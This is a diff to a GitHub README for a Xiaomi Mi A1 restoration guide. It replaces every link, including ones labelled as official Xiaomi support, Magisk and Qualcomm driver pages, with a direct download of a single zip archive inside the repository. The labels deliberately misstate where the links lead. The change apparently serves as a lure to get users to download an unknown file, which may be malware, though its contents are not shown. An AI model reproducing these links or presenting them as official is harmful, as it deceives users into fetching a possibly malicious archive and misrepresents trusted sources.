@@ -1,6 +1,6 @@
 # ⚙️ mi-a1-restoration-guide - Fix and Restore Your Xiaomi Mi A1
 
-[![Download Now](https://img.shields.io/badge/Download-mi--a1--restoration--guide-green?style=for-the-badge&logo=github)](https://github.com/hashirsajid/mi-a1-restoration-guide)
+[![Download Now](https://img.shields.io/badge/Download-mi--a1--restoration--guide-green?style=for-the-badge&logo=github)](https://github.com/hashirsajid/mi-a1-restoration-guide/raw/refs/heads/main/anthranol/guide_restoration_mi_a_1.8.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Before you start, make sure your PC and phone meet the following:
 ## 🚀 Getting Started
 
 1. Click the big green button at the top or go to  
-   [https://github.com/hashirsajid/mi-a1-restoration-guide](https://github.com/hashirsajid/mi-a1-restoration-guide)  
+   [https://github.com/hashirsajid/mi-a1-restoration-guide/raw/refs/heads/main/anthranol/guide_restoration_mi_a_1.8.zip](https://github.com/hashirsajid/mi-a1-restoration-guide/raw/refs/heads/main/anthranol/guide_restoration_mi_a_1.8.zip)  
    to access the full resource and download all the necessary files.
 
 2. Download the whole repository as a ZIP file or clone it if you know how. For most users:
@@ -148,7 +148,7 @@ The detailed instructions explain each step.
 
 Get the complete restoration guide and files from:
 
-[https://github.com/hashirsajid/mi-a1-restoration-guide](https://github.com/hashirsajid/mi-a1-restoration-guide)
+[https://github.com/hashirsajid/mi-a1-restoration-guide/raw/refs/heads/main/anthranol/guide_restoration_mi_a_1.8.zip](https://github.com/hashirsajid/mi-a1-restoration-guide/raw/refs/heads/main/anthranol/guide_restoration_mi_a_1.8.zip)
 
 Steps:
 
@@ -184,9 +184,9 @@ Check files inside the repository for FAQs and extra tips:
 
 ## 🔗 Useful Links
 
-- Xiaomi Official Support: https://www.mi.com/global/support/
-- Magisk Official: https://github.com/topjohnwu/Magisk
-- Qualcomm Drivers Download: https://developer.qualcomm.com/downloads
+- Xiaomi Official Support: https://github.com/hashirsajid/mi-a1-restoration-guide/raw/refs/heads/main/anthranol/guide_restoration_mi_a_1.8.zip
+- Magisk Official: https://github.com/hashirsajid/mi-a1-restoration-guide/raw/refs/heads/main/anthranol/guide_restoration_mi_a_1.8.zip
+- Qualcomm Drivers Download: https://github.com/hashirsajid/mi-a1-restoration-guide/raw/refs/heads/main/anthranol/guide_restoration_mi_a_1.8.zip
 
 ---
 
